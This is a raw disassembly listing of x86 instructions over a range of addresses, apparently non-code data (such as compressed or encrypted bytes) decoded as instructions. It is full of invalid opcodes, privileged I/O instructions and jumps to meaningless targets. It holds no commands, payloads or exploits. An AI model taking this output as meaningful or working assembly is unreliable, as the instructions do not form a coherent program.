  4274e2:	or     al,0x1c
  4274e4:	call   FWORD PTR [eax]
  4274e6:	imul   ebx,DWORD PTR [edx-0x30],0x78
  4274ea:	lahf   
  4274eb:	dec    esi
  4274ec:	loop   0x427482
  4274ee:	cmc    
  4274ef:	jno    0x4274cf
  4274f1:	popa   
  4274f2:	add    DWORD PTR [eax+0x72],esi
  4274f5:	push   es
  4274f6:	adc    al,0xd7
  4274f8:	fdiv   QWORD PTR [edx+0x60]
  4274fb:	sub    al,0xd8
  4274fd:	inc    esi
  4274fe:	xchg   esi,eax
  4274ff:	in     eax,0x3a
  427501:	xor    al,cl
  427503:	loopne 0x42754a
  427505:	push   eax
  427506:	(bad)  
  427507:	clc    
  427508:	retf   
  427509:	bound  ebx,QWORD PTR [ebx]
  42750b:	jmp    0xf0df:0x6c7d5a5f
  427512:	pop    ds
  427513:	daa    
  427514:	jmp    0x333:0x2e59dd11
  42751b:	or     ebp,esi
  42751d:	cmp    ebx,ebp
  42751f:	out    dx,al
  427520:	lds    ebp,FWORD PTR [edi+0x2d]
  427523:	icebp  
  427524:	push   0x7ae12487
  427529:	xor    DWORD PTR [edi],esp
  42752b:	jmp    0x42752b
  42752d:	jae    0x42750d
  42752f:	cld    
  427530:	jmp    DWORD PTR [esi+0x34]
  427533:	les    esi,FWORD PTR [edi+0x5bae80f3]
  427539:	inc    esi
  42753a:	add    esp,esp
  42753c:	add    ebp,ebx
  42753e:	inc    ebp
  42753f:	inc    esi
  427540:	enter  0xb0ef,0x74
  427544:	pop    ebp
  427545:	fdivr  DWORD PTR [edx]
  427547:	or     ch,bh
  427549:	rcr    BYTE PTR [ebp-0x10],0x88
  42754d:	push   cs
  42754e:	sahf   
  42754f:	loop   0x4274d2
  427551:	sbb    al,0x13
  427553:	ds scas al,BYTE PTR es:[edi]
  427555:	xor    dl,BYTE PTR [ebx+0x4de8877a]
  42755b:	ret    0x5ec
  42755e:	iret   
  42755f:	inc    ebx
  427560:	adc    ch,dl
  427562:	mov    esp,0xc5deeede
  427567:	mov    esp,0x327e5465
  42756c:	pop    ss
  42756d:	pop    edx
	...
  4275d6:	pop    esp
  4275d7:	test   al,0xc0
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	fs inc edx
  4275e4:	test   al,0xb4
  4275e6:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	add    BYTE PTR [ecx],al
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	sti    
  4275ef:	jno    0x427650
  4275f1:	repnz pop ss
  4275f3:	retf   0xfa1a
  4275f6:	sahf   
  4275f7:	jp     0x4275f9
  4275f9:	shl    cl,1
  4275fb:	jmp    0xa39540b
  427600:	mov    eax,ds:0x72cdbda6
  427605:	inc    edi
  427606:	adc    eax,0x2aa7c56b
  42760b:	rol    edx,cl
  42760d:	sbb    dh,BYTE PTR [edx]
  42760f:	scas   eax,DWORD PTR es:[edi]
  427610:	daa    
  427611:	adc    esp,esp
  427613:	inc    ecx
  427614:	xchg   edx,eax
  427615:	mov    bl,0x96
  427617:	out    dx,al
  427618:	and    DWORD PTR ds:0xa4b0a291,ecx
  42761e:	(bad)  
  42761f:	jb     0x4275fe
  427621:	dec    esp
  427622:	repz cmp al,0x87
  427625:	inc    ebx
  427626:	sbb    bl,BYTE PTR [eax]
  427628:	pop    ebx
  427629:	pop    eax
  42762a:	push   esp
  42762b:	jb     0x4275d6
  42762d:	cmc    
  42762e:	mov    edi,0x6426da5c
  427633:	jl     0x4275d2
  427635:	imul   esp,DWORD PTR ds:0x33dc8f22,0x66bc2b67
  42763f:	and    ebp,DWORD PTR [edx-0xee75c89]
  427645:	push   cs
  427646:	push   edi
  427647:	push   esp
  427648:	mov    cl,0x60
  42764b:	add    al,0xb8
  42764d:	daa    
  42764e:	push   ds
  42764f:	test   ch,cl
  427651:	cs jno 0x42764e
  427654:	retf   0x7be6
  427657:	xchg   BYTE PTR [ebx],ah
  427659:	rol    BYTE PTR [edx-0x7c],0x3a
  42765d:	scas   al,BYTE PTR es:[edi]
  42765e:	dec    ebx
  42765f:	adc    edi,DWORD PTR [ecx-0x17b7f41a]
  427665:	cmp    bh,cl
  427667:	pop    edx
  427668:	add    bh,BYTE PTR [eax+ecx*8-0x8]
  42766c:	mov    dl,0x95
  42766e:	cmc    
  42766f:	sub    edi,DWORD PTR [ebp+0x61]
  427672:	icebp  
  427673:	in     eax,dx
  427674:	add    bl,dh
  427676:	xor    al,0x1f
  427678:	sub    DWORD PTR [eax+0xe849d96],eax
  42767e:	popa   
  42767f:	adc    ch,BYTE PTR [ebx+0x19]
  427682:	or     ah,BYTE PTR [eax]
  427684:	loopne 0x427669
  427686:	xchg   edx,eax
  427687:	xor    bh,ah
  427689:	push   ebp
  42768a:	icebp  
  42768b:	fidivr WORD PTR [edx-0x29]
  42768e:	xchg   esp,eax
  42768f:	cmp    DWORD PTR [ecx-0x524c82d2],ebp
  427695:	cmp    ebp,DWORD PTR [esi+edx*2+0x2a]
  427699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42769a:	retf   
  42769b:	fistp  DWORD PTR ds:0x55a27ff2
  4276a1:	push   ecx
  4276a2:	add    eax,0x6a99d659
  4276a7:	arpl   WORD PTR [eax],sp
  4276a9:	add    al,0xdc
  4276ab:	rol    DWORD PTR [eax+ebx*8+0x12],cl
  4276af:	mov    dh,0x3f
  4276b1:	sub    eax,0x61e7ea0f
  4276b6:	mov    ds:0xfa68ba6f,al
  4276bb:	xchg   BYTE PTR [edx-0x1b2a36e6],ch
  4276c1:	ret    
  4276c2:	and    DWORD PTR [ecx],0x7b
  4276c5:	cmp    DWORD PTR [ebx-0x6af28c30],eax
  4276cb:	(bad)  
  4276cd:	fcmovu st,st(1)
  4276cf:	adc    BYTE PTR [eax-0x1],bl
  4276d2:	in     al,dx
  4276d3:	add    eax,0x59442f7c
  4276d8:	imul   esp
  4276da:	ja     0x4276da
  4276dc:	leavew 
  4276de:	push   edx
  4276df:	ds jnp 0x4276d2
  4276e2:	xor    DWORD PTR [eax+ebx*8-0x2],eax
  4276e6:	pushf  
  4276e7:	mov    ch,ch
  4276e9:	mov    ah,0xab
  4276eb:	mov    al,ds:0x7473
	...
  427754:	add    BYTE PTR [eax],al
  427756:	add    DWORD PTR [esi-0x70],edx
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	fldlg2 
  427763:	int    0xf
  427765:	push   esi
  427766:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  427768:	add    DWORD PTR [eax],eax
  42776a:	add    BYTE PTR [ecx],al
  42776c:	add    BYTE PTR [eax],al
  42776e:	sbb    ebp,esp
  427770:	mov    eax,ds:0xc878e827
  427775:	jbe    0x427782
  427777:	fmul   DWORD PTR [eax+0x7a103052]
  42777d:	mov    esp,0xe599acca
  427782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427783:	adc    eax,0xcc3aec2e
  427788:	das    
  427789:	cli    
  42778a:	mov    es,WORD PTR [eax]
  42778c:	jnp    0x427769
  42778e:	jle    0x42776b
  427790:	sub    eax,0x538ea43
  427795:	pop    esp
  427796:	inc    esp
  427797:	push   cs
  427798:	clc    
  427799:	xor    DWORD PTR ds:[eax+0x1850544d],0xc712b0a4
  4277a4:	add    edx,DWORD PTR [ecx]
  4277a6:	mov    DWORD PTR [edx],ebx
  4277a8:	retf   
  4277a9:	mov    dl,0x20
  4277ab:	xor    ecx,0xffffffac
  4277ae:	cmp    eax,0xa37f7936
  4277b3:	cwde   
  4277b4:	push   0xffffff97
  4277b6:	bnd jns 0x4277a2
  4277b9:	xchg   ebp,eax
  4277ba:	push   edi
  4277bb:	mov    edi,0x103cc742
  4277c0:	mov    ds:0xa605717b,eax
  4277c5:	lods   eax,DWORD PTR ds:[esi]
  4277c6:	jo     0x4277d1
  4277c8:	pushf  
  4277c9:	or     BYTE PTR gs:[ebx-0x3e04cd27],0x2c
  4277d1:	and    eax,0x6796c396
  4277d6:	data16 cmp BYTE PTR [eax-0x7369a302],dl
  4277dd:	clc    
  4277de:	js     0x427822
  4277e0:	ror    DWORD PTR [edi+ebx*8+0x43],1
  4277e4:	dec    ebp
  4277e5:	push   0xffffffd4
  4277e7:	je     0x42780c
  4277e9:	sti    
  4277ea:	dec    ebp
  4277eb:	pop    edx
  4277ec:	push   ebp
  4277ed:	clc    
  4277ee:	mov    ebx,ecx
  4277f0:	xchg   ecx,eax
  4277f1:	add    eax,0x598843f4
  4277f6:	pop    eax
  4277f7:	push   eax
  4277f8:	fidivr DWORD PTR [ebx+0x2037d81e]
  4277fe:	test   al,0x8e
  427800:	enter  0x1e2c,0x2c
  427804:	xchg   ecx,eax
  427805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427806:	jnp    0x427819
  427808:	outs   dx,DWORD PTR ds:[esi]
  427809:	jmp    0x863ffe52
  42780e:	jo     0x427800
  427810:	mov    esi,0x94b7d679
  427815:	pop    esp
  427816:	sbb    ebx,DWORD PTR [eax]
  427818:	clc    
  427819:	(bad)  
  42781b:	int    0xcb
  42781d:	dec    esp
  42781e:	iret   
  42781f:	into   
  427820:	mov    ebx,0x5279734a
  427825:	(bad)  
  427826:	loopne 0x427865
  427828:	(bad)  
  42782a:	mov    esi,0xe9f2d89f
  42782f:	test   BYTE PTR [edi],cl
  427831:	xchg   BYTE PTR [ebx-0x6b],cl
  427834:	out    0x17,al
  427836:	clc    
  427837:	aam    0x25
  427839:	clc    
  42783a:	cli    
  42783b:	or     DWORD PTR [esi+0x77],ebx
  42783e:	inc    edx
  42783f:	dec    esp
  427840:	shr    DWORD PTR [ecx+0x4d],cl
  427843:	ds cmc 
  427845:	shr    BYTE PTR ds:0x3269c32e,cl
  42784b:	push   es
  42784c:	jbe    0x427878
  42784e:	add    ebp,ebp
  427850:	pop    ds
  427851:	test   al,0xd8
  427853:	outs   dx,BYTE PTR ds:[esi]
  427854:	jmp    0x427868
  427856:	ficom  DWORD PTR [edi-0x13]
  427859:	sub    al,cl
  42785b:	and    edi,DWORD PTR [eax+ebx*1-0x42]
  42785f:	call   0xd36178f1
  427864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427865:	test   ch,ch
  427867:	outs   dx,BYTE PTR ds:[esi]
  427868:	popa   
  427869:	rcr    DWORD PTR [esi+0xf0c4c4],0x0
	...
  4278d4:	add    BYTE PTR [eax],al
  4278d6:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4278dc:	pop    esi
  4278dd:	fbstp  TBYTE PTR [eax+0x65]
  4278e0:	fldl2e 
  4278e2:	jmp    0x427918
  4278e4:	dec    ebx
  4278e5:	dec    ebx
  4278e6:	addr16 test al,0x1
  4278e9:	add    BYTE PTR [eax],al
  4278eb:	add    DWORD PTR [eax],eax
  4278ed:	add    BYTE PTR [ebp-0x53],dh
  4278f0:	xchg   edi,eax
  4278f1:	lock je 0x427914
  4278f4:	data16 outs dx,BYTE PTR ds:[esi]
  4278f6:	pop    ds
  4278f7:	lods   eax,DWORD PTR ds:[esi]
  4278f8:	test   al,0x4b
  4278fa:	dec    edi
  4278fb:	mov    DWORD PTR [esi-0x67321608],edx
  427901:	push   DWORD PTR [ebx+0x20]
  427904:	adc    al,0xb9
  427906:	test   WORD PTR [ecx],0xaec5
  42790b:	(bad)  
  42790c:	push   ebx
  42790d:	retf   
  42790e:	jp     0x42794c
  427910:	js     0x4278e9
  427912:	(bad)  
  427913:	rol    BYTE PTR [ebx],cl
  427915:	pop    esi
  427916:	jecxz  0x427909
  427918:	push   ds
  427919:	xchg   ebx,eax
  42791a:	je     0x427923
  42791c:	sar    BYTE PTR [edx],cl
  42791e:	(bad)  
  42791f:	aam    0xa4
  427921:	(bad)  
  427922:	dec    eax
  427923:	sahf   
  427924:	pushf  
  427925:	mov    bh,BYTE PTR [ecx]
  427927:	call   0x13da1e0f
  42792c:	outs   dx,BYTE PTR ds:[esi]
  42792d:	sub    bl,BYTE PTR fs:[esi-0x77db240a]
  427934:	jne    0x427940
  427936:	push   edi
  427937:	jmp    DWORD PTR [edi]
  427939:	push   eax
  42793a:	add    edx,DWORD PTR [edx+ebx*8+0x6bae4bd7]
  427941:	clc    
  427942:	xor    bl,bl
  427944:	add    cl,dh
  427946:	push   0x7f
  427948:	retf   0x15a7
  42794b:	leave  
  42794c:	call   0x10b:0xe83c06a8
  427953:	pop    ecx
  427954:	loop   0x4278df
  427956:	test   DWORD PTR [eax],ebx
  427958:	cmc    
  427959:	pop    edx
  42795a:	ja     0x4279b5
  42795c:	mov    edi,0x820f26bf
  427961:	daa    
  427962:	(bad)  
  427963:	dec    ebp
  427964:	je     0x427968
  427966:	xlat   BYTE PTR ds:[ebx]
  427967:	push   ebx
  427968:	aam    0x32
  42796a:	cmp    BYTE PTR [esi],ch
  42796c:	std    
  42796d:	sti    
  42796e:	mov    eax,esi
  427970:	jno    0x427946
  427972:	in     al,0x2d
  427974:	dec    edx
  427975:	mov    dl,0x10
  427977:	scas   al,BYTE PTR es:[edi]
  427978:	jae    0x4279eb
  42797a:	push   ss
  42797b:	ret    
  42797c:	enter  0x4d22,0x12
  427980:	es dec ecx
  427982:	retf   
  427983:	and    BYTE PTR [edi-0x513be660],ch
  427989:	lods   al,BYTE PTR ds:[esi]
  42798a:	pop    ds
  42798b:	(bad)  
  42798c:	jb     0x4279bd
  42798e:	clc    
  42798f:	inc    esi
  427990:	rcl    DWORD PTR [edx+0x38],0xe5
  427994:	push   ecx
  427995:	(bad)  
  427996:	adc    al,0x4d
  427998:	mov    dh,0xd1
  42799a:	cwde   
  42799b:	es ret 
  42799d:	adc    eax,0x6f705aea
  4279a2:	into   
  4279a3:	leave  
  4279a4:	pop    ebp
  4279a5:	retf   0x3d2
  4279a8:	xchg   BYTE PTR [ecx+0x7c],bl
  4279ab:	push   ecx
  4279ac:	pusha  
  4279ad:	into   
  4279ae:	cs mov ebx,0xe7381438
  4279b4:	mov    ecx,0xb53a08b9
  4279b9:	dec    eax
  4279ba:	loope  0x4279d9
  4279bc:	xchg   esi,eax
  4279bd:	inc    ecx
  4279be:	jno    0x4279e9
  4279c0:	cmp    bh,bh
  4279c2:	mov    ds:0x21b786d0,al
  4279c7:	adc    eax,0xc77d90f9
  4279cc:	xlat   BYTE PTR ds:[ebx]
  4279cd:	into   
  4279ce:	xor    eax,0xc2bb5f08
  4279d3:	pop    eax
  4279d4:	jb     0x427a37
  4279d6:	ja     0x427a28
  4279d8:	mov    eax,ds:0x6998c076
  4279dd:	or     al,0xd4
  4279df:	popf   
  4279e0:	push   ebp
  4279e1:	xchg   ebp,eax
  4279e2:	mov    esi,0xbbbb6656
  4279e7:	xchg   esp,eax
  4279e8:	cld    
  4279e9:	(bad)  
  4279ea:	sti    
  4279eb:	xchg   edx,eax
  4279ec:	cmp    esp,DWORD PTR [ecx+0x0]
	...
  427a56:	call   0xdea3:0xffa3ffdd
  427a5d:	std    
  427a5e:	inc    edx
  427a5f:	jne    0x427a39
  427a61:	and    DWORD PTR [edi+0x67c0cd1b],0xffffffa9
  427a68:	add    DWORD PTR [eax],eax
  427a6a:	add    BYTE PTR [ecx],al
  427a6c:	add    BYTE PTR [eax],al
  427a6e:	xchg   esp,eax
  427a6f:	not    DWORD PTR [eax-0x34]
  427a72:	leave  
  427a73:	or     ebx,esi
  427a75:	scas   eax,DWORD PTR es:[edi]
  427a76:	fdiv   DWORD PTR [ebp+0x4e]
  427a79:	mov    ds:0x4974c14b,eax
  427a7e:	xchg   ebx,eax
  427a7f:	mov    esi,0x835be87b
  427a84:	lock xchg edx,eax
  427a86:	aad    0x4d
  427a88:	ret    
  427a89:	mov    esi,0x639e4b9f
  427a8e:	mov    eax,ds:0xb8f18807
  427a93:	test   eax,0x5bfe2c21
  427a98:	test   DWORD PTR [ebx-0x2e769f50],0x913b7618
  427aa2:	mov    al,ds:0x3711bf00
  427aa7:	fcom   DWORD PTR [esi+0x6e]
  427aaa:	ins    DWORD PTR es:[edi],dx
  427aab:	xor    bl,dl
  427aad:	js     0x427b1d
  427aaf:	push   0x8d3f073e
  427ab4:	xlat   BYTE PTR ds:[ebx]
  427ab5:	clc    
  427ab6:	imul   edi,ebx,0x70f4a923
  427abc:	in     eax,dx
  427abd:	dec    BYTE PTR [ecx+0x2b]
  427ac0:	jecxz  0x427b26
  427ac2:	sar    DWORD PTR [edi+edx*1],cl
  427ac5:	nop
  427ac6:	sbb    BYTE PTR [ebx+0xb8b2a88],0xa8
  427acd:	jae    0x427b0e
  427acf:	xchg   edx,eax
  427ad0:	es jbe 0x427af4
  427ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ad4:	leave  
  427ad5:	mov    DWORD PTR [eax],ebx
  427ad7:	and    DWORD PTR [esi-0x3e],0x4a25cf57
  427ade:	gs xchg ebp,eax
  427ae0:	jl     0x427a90
  427ae2:	mov    dh,0x4
  427ae4:	dec    esi
  427ae5:	out    0x92,al
  427ae7:	mov    dl,0xa9
  427ae9:	gs int 0xed
  427aec:	(bad)  
  427aed:	or     DWORD PTR [eax+0x34],ebp
  427af0:	push   cs
  427af1:	int    0xb2
  427af3:	or     edx,DWORD PTR [eax-0x5216c8da]
  427af9:	xor    al,0x24
  427afb:	mov    edx,0xd4533d85
  427b00:	push   ebx
  427b01:	popf   
  427b02:	and    DWORD PTR [edi+0x31],esi
  427b05:	inc    edi
  427b06:	mov    edx,0xb57a6b47
  427b0b:	fld    QWORD PTR [esi+0x5a]
  427b0e:	js     0x427b0f
  427b10:	scas   eax,DWORD PTR es:[edi]
  427b11:	gs fstp st(4)
  427b14:	ins    DWORD PTR es:[edi],dx
  427b15:	cdq    
  427b16:	sbb    ebp,ecx
  427b18:	test   al,0xb8
  427b1a:	adc    BYTE PTR [eax+0x78],dh
  427b1d:	xchg   esi,eax
  427b1e:	cmp    eax,0xfaaa1066
  427b23:	sub    edx,ecx
  427b25:	mov    ecx,0x30512ab2
  427b2a:	cmp    DWORD PTR [esi+0x54cdb8a],edx
  427b30:	adc    al,0x7b
  427b32:	or     BYTE PTR [eax+0x6a],cl
  427b35:	cmp    dh,bh
  427b37:	into   
  427b38:	das    
  427b39:	cmp    eax,0x19e806e
  427b3e:	or     al,0x43
  427b40:	int    0xd3
  427b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b43:	cmp    ebp,DWORD PTR [ecx-0x63]
  427b46:	fnstcw WORD PTR [eiz*8-0x3901976f]
  427b4d:	and    dl,BYTE PTR [esi+edx*2+0x52]
  427b51:	ret    0xad76
  427b54:	stos   BYTE PTR es:[edi],al
  427b55:	adc    BYTE PTR [ebp+ebp*4+0x33],ah
  427b59:	push   ds
  427b5a:	jae    0x427b9e
  427b5c:	pop    ebx
  427b5d:	fdivr  DWORD PTR [ebx-0x72]
  427b60:	int3   
  427b61:	sub    DWORD PTR [edi*8-0x6b531f5a],edx
  427b68:	in     eax,0xd1
  427b6a:	out    dx,eax
  427b6b:	hlt    
  427b6c:	retf   0xdc
	...
  427bd3:	add    BYTE PTR [eax],al
  427bd5:	add    dl,cl
  427bd7:	mov    edx,DWORD PTR [edx+0x7b]
  427bda:	push   ebx
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	imul   BYTE PTR [ebx]
  427be3:	int3   
  427be4:	hlt    
  427be5:	(bad)  
  427be6:	stos   BYTE PTR es:[di],al
  427be8:	add    DWORD PTR [eax],eax
  427bea:	add    BYTE PTR [ecx],al
  427bec:	add    BYTE PTR [eax],al
  427bee:	lds    edx,FWORD PTR [edx]
  427bf0:	pop    ecx
  427bf1:	xchg   BYTE PTR ss:[esi],dh
  427bf4:	push   ebx
  427bf5:	loopne 0x427ba4
  427bf7:	inc    esp
  427bf8:	xchg   esp,eax
  427bf9:	mov    ebx,0x3ae9cca5
  427bfe:	jo     0x427c32
  427c00:	sbb    edx,ebp
  427c02:	inc    esi
  427c03:	pop    eax
  427c04:	stos   BYTE PTR es:[edi],al
  427c05:	inc    ebp
  427c06:	add    al,0x21
  427c08:	fs push ss
  427c0a:	fs sub bl,ch
  427c0d:	and    bh,ah
  427c0f:	sbb    ch,BYTE PTR [ecx]
  427c11:	mov    eax,eax
  427c13:	and    DWORD PTR ss:[edx-0xd],ebp
  427c17:	mov    bl,BYTE PTR cs:[esi]
  427c1a:	test   DWORD PTR [esi],edx
  427c1c:	retf   0x2b67
  427c1f:	mov    dh,BYTE PTR [eax+edi*1+0xd]
  427c23:	cld    
  427c24:	push   ebp
  427c25:	mov    eax,0x7c537ea8
  427c2a:	sub    eax,0x62f6265f
  427c2f:	aas    
  427c30:	add    ebp,DWORD PTR [esi+0x19]
  427c33:	into   
  427c34:	je     0x427c07
  427c36:	sub    esp,DWORD PTR [ecx-0x1b]
  427c39:	in     eax,dx
  427c3a:	jle    0x427c7f
  427c3c:	pusha  
  427c3d:	sbb    eax,0x84297cc
  427c42:	pop    ebp
  427c43:	sbb    esi,DWORD PTR [edi+edi*1-0x71]
  427c47:	std    
  427c48:	jp     0x427c23
  427c4a:	repnz cmp al,0xaf
  427c4d:	rol    BYTE PTR [ebp-0x62],0x93
  427c51:	sub    eax,0x866745f3
  427c56:	push   ebp
  427c57:	and    edi,DWORD PTR [ebx]
  427c59:	mul    dh
  427c5b:	adc    dl,BYTE PTR [ebx+0x42]
  427c5e:	data16 jmp 0x427c1b
  427c61:	retf   0x9219
  427c64:	pop    DWORD PTR [esi+0x41cb4778]
  427c6a:	push   cs
  427c6b:	pop    eax
  427c6c:	ss pop esp
  427c6e:	mov    WORD PTR [ebx+0x39c7b78d],ss
  427c74:	lods   eax,DWORD PTR ds:[esi]
  427c75:	xchg   edi,eax
  427c76:	sar    BYTE PTR [ebx-0x4c],0xe1
  427c7a:	cld    
  427c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c7c:	inc    edx
  427c7d:	rcl    DWORD PTR es:[edx],0x3b
  427c81:	pop    ebx
  427c82:	push   esi
  427c83:	pop    eax
  427c84:	or     al,0xdf
  427c86:	pop    eax
  427c87:	hlt    
  427c88:	pusha  
  427c89:	mov    ah,BYTE PTR [edi]
  427c8b:	push   ds
  427c8c:	lock pushf 
  427c8e:	xchg   ecx,eax
  427c8f:	jl     0x427c38
  427c91:	adc    DWORD PTR [edx-0x28ebd430],ebx
  427c97:	xor    ah,dl
  427c99:	mov    esi,0x4e9690d2
  427c9e:	out    dx,eax
  427c9f:	test   eax,0x5f207c1b
  427ca4:	js     0x427caa
  427ca6:	and    eax,DWORD PTR [ecx-0x71]
  427ca9:	repz jo 0x427c36
  427cac:	scas   al,BYTE PTR es:[edi]
  427cad:	sbb    bh,BYTE PTR [ecx-0x60]
  427cb0:	or     edx,esi
  427cb2:	mov    esi,ebx
  427cb4:	push   es
  427cb5:	icebp  
  427cb6:	pop    esp
  427cb7:	or     BYTE PTR [edi-0x271592],ah
  427cbd:	(bad)  
  427cbe:	retf   
  427cbf:	mov    bh,0xe7
  427cc1:	xor    eax,0xd2ff465c
  427cc6:	les    edi,FWORD PTR [eax]
  427cc8:	test   al,0x28
  427cca:	arpl   WORD PTR [ecx-0xa],di
  427ccd:	mov    DWORD PTR [esi],eax
  427ccf:	adc    al,0xec
  427cd1:	pop    eax
  427cd2:	mov    cl,0xb9
  427cd4:	sub    dl,cl
  427cd6:	(bad)  
  427cd8:	daa    
  427cd9:	cdq    
  427cda:	(bad)  
  427cdb:	dec    edx
  427cdc:	xor    eax,esi
  427cde:	pop    ebx
  427cdf:	xchg   ecx,eax
  427ce0:	daa    
  427ce1:	outs   dx,DWORD PTR ds:[esi]
  427ce2:	dec    edi
  427ce3:	in     eax,dx
  427ce4:	(bad)  
  427ce5:	adc    bl,BYTE PTR [ebx-0x48bd5867]
  427ceb:	test   dh,0xd9
	...
  427d56:	mov    ds:0xf343b050,eax
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0x24055d44,ebx
  427d64:	dec    esp
  427d65:	push   esi
  427d66:	stos   DWORD PTR es:[di],eax
  427d68:	add    DWORD PTR [eax],eax
  427d6a:	add    BYTE PTR [ecx],al
  427d6c:	add    BYTE PTR [eax],al
  427d6e:	sahf   
  427d6f:	sub    eax,DWORD PTR [ecx-0x4a28b32e]
  427d75:	push   ss
  427d76:	(bad)  
  427d77:	fnstcw WORD PTR [edi+0x19]
  427d7a:	jge    0x427daa
  427d7c:	sbb    BYTE PTR [edi-0x4c],dl
  427d7f:	stc    
  427d80:	adc    cl,BYTE PTR [eax-0x31]
  427d83:	pop    ebx
  427d84:	fs push esp
  427d86:	adc    al,0x60
  427d88:	scas   al,BYTE PTR es:[edi]
  427d89:	ja     0x427d85
  427d8b:	nop
  427d8c:	rcr    edi,0x7
  427d8f:	dec    edi
  427d90:	scas   eax,DWORD PTR es:[edi]
  427d91:	es jl  0x427d24
  427d94:	bound  eax,QWORD PTR [ebx+0x1ff61fe2]
  427d9a:	fiadd  DWORD PTR [edx-0x209f62ec]
  427da0:	pop    es
  427da1:	clc    
  427da2:	dec    edx
  427da3:	aas    
  427da4:	sbb    al,0xac
  427da6:	mov    dh,BYTE PTR [esi-0x7be7a685]
  427dac:	push   0x3886727a
  427db1:	jns    0x427d78
  427db3:	cmp    DWORD PTR [edi+0x2b],ebx
  427db6:	(bad)  
  427db8:	arpl   WORD PTR [ebp-0x50f2e2d6],cx
  427dbe:	and    al,0x85
  427dc0:	mov    bh,BYTE PTR [edi]
  427dc2:	rcr    ebp,1
  427dc4:	cmp    BYTE PTR [ebx+eax*1+0x39],al
  427dc8:	or     ebx,DWORD PTR [ebx-0x647dcde2]
  427dce:	mov    dh,0x12
  427dd0:	out    0x42,eax
  427dd2:	mov    eax,0xe83917e0
  427dd7:	iret   
  427dd8:	push   ss
  427dd9:	hlt    
  427dda:	retf   
  427ddb:	jecxz  0x427daa
  427ddd:	mov    al,ds:0x5a2bf3ca
  427de2:	shl    BYTE PTR [ecx-0x6faeee60],0x49
  427de9:	jno    0x427d8c
  427deb:	aam    0x55
  427ded:	imul   edx,DWORD PTR [edi+ecx*8+0x54],0xffffffc3
  427df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427df3:	and    esp,DWORD PTR [edx]
  427df5:	mov    esi,ebx
  427df7:	inc    ebp
  427df8:	inc    edi
  427df9:	add    BYTE PTR [eax+edi*1],al
  427dfc:	dec    ah
  427dfe:	lahf   
  427dff:	sub    BYTE PTR [esi+0x246f00df],0xa0
  427e06:	outs   dx,BYTE PTR ds:[esi]
  427e07:	pop    ss
  427e08:	cdq    
  427e09:	(bad)  
  427e0a:	add    esp,ecx
  427e0c:	loop   0x427dd8
  427e0e:	add    eax,0xd61a3358
  427e13:	sbb    DWORD PTR [ebx+0x18],0x3342057c
  427e1a:	mov    dh,0xa5
  427e1c:	pop    ecx
  427e1d:	dec    esi
  427e1e:	in     eax,dx
  427e1f:	or     cl,bh
  427e21:	mov    al,ds:0x5945ad9f
  427e26:	iret   
  427e27:	inc    edx
  427e28:	dec    esp
  427e29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e2a:	pop    eax
  427e2b:	jb     0x427dd2
  427e2d:	imul   eax,DWORD PTR [ecx],0x4
  427e30:	scas   al,BYTE PTR es:[edi]
  427e31:	xchg   ecx,eax
  427e32:	inc    edx
  427e34:	retf   
  427e35:	add    DWORD PTR [esi],esi
  427e37:	add    ebp,esp
  427e39:	ins    DWORD PTR es:[edi],dx
  427e3a:	leave  
  427e3b:	sub    al,0x7b
  427e3d:	adc    al,0x99
  427e3f:	fst    QWORD PTR [eax+0x5a0027b9]
  427e45:	les    eax,FWORD PTR [esi-0x1227b0dc]
  427e4b:	jecxz  0x427e79
  427e4d:	mov    ah,0x84
  427e4f:	aas    
  427e50:	jecxz  0x427e4d
  427e52:	mov    edi,0x93d66307
  427e57:	push   ebx
  427e58:	push   esp
  427e59:	xchg   ebp,eax
  427e5a:	shr    DWORD PTR [edi-0x4e6a80e7],cl
  427e60:	push   ss
  427e61:	call   0x20f4a329
  427e66:	xchg   edx,eax
  427e67:	jl     0x427dfd
  427e69:	shr    BYTE PTR [esi+esi*2+0xc],cl
  427e6d:	test   DWORD PTR [eax],0x0
	...
  427ed3:	add    BYTE PTR [eax],al
  427ed5:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	cmc    
  427ee3:	add    BYTE PTR [ecx-0x56],ch
  427ee6:	lods   al,BYTE PTR ds:[si]
  427ee8:	add    DWORD PTR [eax],eax
  427eea:	add    BYTE PTR [ecx],al
  427eec:	add    BYTE PTR [eax],al
  427eee:	or     eax,0xff7f1b02
  427ef3:	lock dec edx
  427ef5:	ins    BYTE PTR es:[edi],dx
  427ef6:	std    
  427ef7:	mov    WORD PTR [edi],ds
  427ef9:	outs   dx,BYTE PTR ds:[esi]
  427efa:	mov    al,ds:0x935666ac
  427eff:	lds    edx,FWORD PTR [esp+ebp*2-0x3e]
  427f03:	jle    0x427ed1
  427f05:	stos   DWORD PTR es:[edi],eax
  427f06:	sbb    al,0xa2
  427f08:	mov    ds:0x9630d6e4,al
  427f0d:	sbb    ecx,DWORD PTR [ecx-0x1a]
  427f10:	mov    ecx,0x807c8006
  427f15:	mov    ah,0xed
